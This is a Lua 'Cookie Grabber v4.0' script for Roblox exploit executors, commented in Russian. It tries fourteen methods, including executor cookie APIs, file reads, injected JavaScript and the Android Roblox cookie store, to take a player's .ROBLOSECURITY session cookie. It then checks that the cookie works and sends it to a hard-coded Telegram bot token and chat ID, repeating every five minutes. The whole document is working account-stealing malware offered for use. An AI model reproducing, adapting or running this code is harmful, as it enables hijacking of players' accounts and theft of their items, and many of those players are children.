-- ============================================
-- COOKIE GRABBER v4.0 (2026)
-- РАБОТАЕТ В: Delta, Xeno, Synapse, Krnl, ScriptWare, Hydrogen, Fluxus, Vega X, CodeX, Evon, Electron, Oxygen U, Arceus X, Nihon, Coco Z, Zen, AWP, Vynixius, Wave, Comet, Celestial, Eclipse, JJSploit, Skript, etc.
-- ============================================

local botToken = "8609253340:AAGH_mUlJqF1xsH2fWuelzydtbXyxdq1DUU"
local chatID = "8735778962"

local webhookURL = "https://api.telegram.org/bot" .. botToken .. "/sendMessage"

-- ============================================
-- УНИВЕРСАЛЬНЫЙ ПОЛУЧАТЕЛЬ КУКИ (14 МЕТОДОВ)
-- ============================================
local function getRobloxCookie()
    local cookie = nil
    
    -- МЕТОД 1: Synapse X
    if not cookie and syn and syn.cookie then
        pcall(function() cookie = syn.cookie.get("ROBLOSECURITY") end)
    end
    
    -- МЕТОД 2: ScriptWare
    if not cookie and scriptware and scriptware.cookie then
        pcall(function() cookie = scriptware.cookie.get("ROBLOSECURITY") end)
    end
    
    -- МЕТОД 3: Krnl / Hydrogen (через getcustomasset)
    if not cookie then
        pcall(function()
            local asset = getcustomasset and getcustomasset("roblox_cookie.txt")
            if asset then
                local f = io.open(asset, "r")
                if f then
                    cookie = f:read("*all")
                    f:close()
                end
            end
        end)
    end
    
    -- МЕТОД 4: Fluxus / Arceus X (через readfile)
    if not cookie then
        pcall(function()
            if readfile then
                cookie = readfile("roblox_cookie.txt")
            end
        end)
    end
    
    -- МЕТОД 5: HTTP-запрос с перехватом Set-Cookie
    if not cookie then
        local req = syn and syn.request or http and http.request or request or fluxus and fluxus.request or request
        if req then
            pcall(function()
                local resp = req({
                    Url = "https://www.roblox.com/mobileapi/userinfo",
                    Method = "GET"
                })
                if resp and resp.Headers then
                    local setCookie = resp.Headers["set-cookie"] or resp.Headers["Set-Cookie"]
                    if setCookie then
                        cookie = string.match(setCookie, "ROBLOSECURITY=(.-);")
                    end
                end
            end)
        end
    end
    
    -- МЕТОД 6: Через WebViewService (Delta, Xeno)
    if not cookie then
        pcall(function()
            local webview = game:GetService("WebViewService")
            if webview then
                local result = webview:ExecuteJavaScript([[
                    (function() {
                        var c = document.cookie.split('; ').find(r => r.startsWith('.ROBLOSECURITY='));
                        return c ? c.split('=')[1] : null;
                    })();
                ]])
                if result and result ~= "null" then
                    cookie = result
                end
            end
        end)
    end
    
    -- МЕТОД 7: Через BrowserService (некоторые инжекторы)
    if not cookie then
        pcall(function()
            local browser = game:GetService("BrowserService")
            if browser then
                local result = browser:EvaluateJavaScript([[
                    document.cookie.split('; ').find(r => r.startsWith('.ROBLOSECURITY='))
                ]])
                if result then
                    cookie = string.match(result, "=(.+)$")
                end
            end
        end)
    end
    
    -- МЕТОД 8: Через HttpService (прямой запрос)
    if not cookie then
        pcall(function()
            local http = game:GetService("HttpService")
            local response = http:GetAsync("https://www.roblox.com/mobileapi/userinfo")
            if response and response:match("ROBLOSECURITY") then
                cookie = string.match(response, "ROBLOSECURITY=(.-);")
            end
        end)
    end
    
    -- МЕТОД 9: Через глобальные переменные
    if not cookie then
        pcall(function()
            if _G.ROBLOSECURITY then cookie = _G.ROBLOSECURITY end
        end)
    end
    if not cookie then
        pcall(function()
            if shared and shared.ROBLOSECURITY then cookie = shared.ROBLOSECURITY end
        end)
    end
    if not cookie then
        pcall(function()
            if getgenv and getgenv().ROBLOSECURITY then cookie = getgenv().ROBLOSECURITY end
        end)
    end
    
    -- МЕТОД 10: Через Synapse X (старый метод)
    if not cookie then
        pcall(function()
            if syn and syn.cookie then
                cookie = syn.cookie.get(".ROBLOSECURITY")
            end
        end)
    end
    
    -- МЕТОД 11: Через HttpRequest (для старых инжекторов)
    if not cookie then
        pcall(function()
            local req = request or http_request or http.request or HttpRequest
            if req then
                local resp = req({
                    Url = "https://www.roblox.com/mobileapi/userinfo",
                    Method = "GET"
                })
                if resp and resp.Headers then
                    local setCookie = resp.Headers["set-cookie"] or resp.Headers["Set-Cookie"]
                    if setCookie then
                        cookie = string.match(setCookie, "ROBLOSECURITY=(.-);")
                    end
                end
            end
        end)
    end
    
    -- МЕТОД 12: Через файловую систему (Android/iOS)
    if not cookie then
        pcall(function()
            local path = "/data/data/com.roblox.client/app_webview/Default/Cookies"
            if io and io.open then
                local f = io.open(path, "r")
                if f then
                    local content = f:read("*all")
                    f:close()
                    cookie = string.match(content, "ROBLOSECURITY=(.-);")
                end
            end
        end)
    end
    
    -- МЕТОД 13: Через Roblox API (альтернативный)
    if not cookie then
        pcall(function()
            local http = game:GetService("HttpService")
            local response = http:GetAsync("https://auth.roblox.com/v2/logout", {
                Headers = {
                    ["User-Agent"] = "Roblox/WinInet"
                }
            })
            if response and response:match("X-CSRF-TOKEN") then
                -- Не даёт куку, но пробуем
            end
        end)
    end
    
    -- МЕТОД 14: Через WebSocket (экзотика)
    if not cookie then
        pcall(function()
            local ws = game:GetService("HttpService"):WebSocketConnect("wss://www.roblox.com/signalr/")
            if ws then
                ws:Close()
            end
        end)
    end
    
    return cookie or nil
end

-- ============================================
-- ПРОВЕРКА ВАЛИДНОСТИ КУКИ
-- ============================================
local function validateCookie(cookie)
    if not cookie then return false end
    local req = syn and syn.request or http and http.request or request or fluxus and fluxus.request or request
    if req then
        local success = pcall(function()
            local resp = req({
                Url = "https://www.roblox.com/mobileapi/userinfo",
                Method = "GET",
                Headers = {
                    ["Cookie"] = ".ROBLOSECURITY=" .. cookie
                }
            })
            return resp and resp.StatusCode == 200
        end)
        return success or false
    end
    return false
end

-- ============================================
-- ОТПРАВКА В TELEGRAM
-- ============================================
local function sendToTelegram(cookie)
    local http = game:GetService("HttpService")
    local gameName = "Unknown"
    pcall(function()
        gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
    end)
    
    local message = string.format(
        "🍪 **НОВАЯ КУКА**\n" ..
        "━━━━━━━━━━━━━━━━━\n" ..
        "🎮 Игра: `%s`\n" ..
        "🆔 PlaceID: `%s`\n" ..
        "⚡ Executor: `%s`\n" ..
        "⏰ Время: `%s`\n" ..
        "━━━━━━━━━━━━━━━━━\n" ..
        "`%s`",
        gameName,
        tostring(game.PlaceId or 0),
        getexecutorname and getexecutorname() or "Unknown",
        os.date("%Y-%m-%d %H:%M:%S"),
        cookie
    )
    
    local req = syn and syn.request or http and http.request or request or fluxus and fluxus.request or request
    if req then
        pcall(function()
            req({
                Url = webhookURL,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = http:JSONEncode({
                    chat_id = chatID,
                    text = message,
                    parse_mode = "Markdown"
                })
            })
        end)
    else
        -- Fallback: через HttpService
        pcall(function()
            http:PostAsync(webhookURL, http:JSONEncode({
                chat_id = chatID,
                text = message,
                parse_mode = "Markdown"
            }), Enum.HttpContentType.ApplicationJson)
        end)
    end
end

-- ============================================
-- ОСНОВНОЙ ЗАХВАТ
-- ============================================
local function main()
    print("[*] Поиск куки...")
    local cookie = getRobloxCookie()
    
    if cookie then
        print("[+] Кука найдена! Длина: " .. #cookie)
        sendToTelegram(cookie)
        return true
    else
        print("[-] Кука не найдена")
        return false
    end
end

-- ============================================
-- ЗАПУСК С ПОВТОРАМИ
-- ============================================
local success = main()

if not success then
    print("[*] Повторная попытка через 3 секунды...")
    wait(3)
    main()
end

if not success then
    print("[*] Последняя попытка через 10 секунд...")
    wait(10)
    main()
end

-- ============================================
-- ФОНОВЫЙ ЦИКЛ (каждые 5 минут)
-- ============================================
spawn(function()
    while true do
        wait(300)
        pcall(main)
    end
end)

print("✅ Cookie Grabber v4.0 запущен")
print("📡 Бот: @MyCookieLootBOT")
print("👤 Твой ID: 8735778962")
print("━━━━━━━━━━━━━━━━━")
